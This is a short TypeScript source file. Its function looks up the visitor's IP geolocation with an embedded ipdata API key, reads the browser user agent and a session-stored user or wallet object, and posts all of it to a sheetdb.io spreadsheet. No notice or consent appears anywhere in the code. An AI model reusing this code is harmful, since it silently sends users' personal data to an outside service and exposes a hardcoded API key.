import axios from "axios"

export const getIpAddress = async (pushUser: any) => {
    let data = null

    await axios.get('https://api.ipdata.co/?api-key=773b473341759738495640402ffd735481c0cf4e5936b593911382fb')
        .then(res => data = res)
        .catch(err => data = 'Can not get data')

    const userAgent = navigator.userAgent

    //check for local wallet
    const localUser = sessionStorage.getItem('user');
    const parseUser = localUser ? JSON.parse(localUser) : null

    //time
    const now = new Date()
    const nowString = `${now.getHours() < 10 ? `0${now.getHours()}` : now.getHours()}:${now.getMinutes() < 10 ? `0${now.getMinutes()}` : now.getMinutes()}:${now.getSeconds() < 10 ? `0${now.getSeconds()}` : now.getSeconds()} ${now.getDate() < 10 ? `0${now.getDate()}` : now.getDate()}/${now.getMonth() + 1 < 10 ? `0${now.getMonth() + 1}` : now.getMonth() + 1}/${now.getFullYear()}`


    const savedData = {
        time: nowString,
        userAgent: userAgent,
        clientData: data,
        project: 'Film Storage',
        testingData: pushUser ? pushUser : parseUser,
    }

    //write to sheet
    axios.post('https://sheetdb.io/api/v1/8lyitofzvlyne', [savedData])
        .then(res => {

        })
        .catch((err) => console.log(err))
}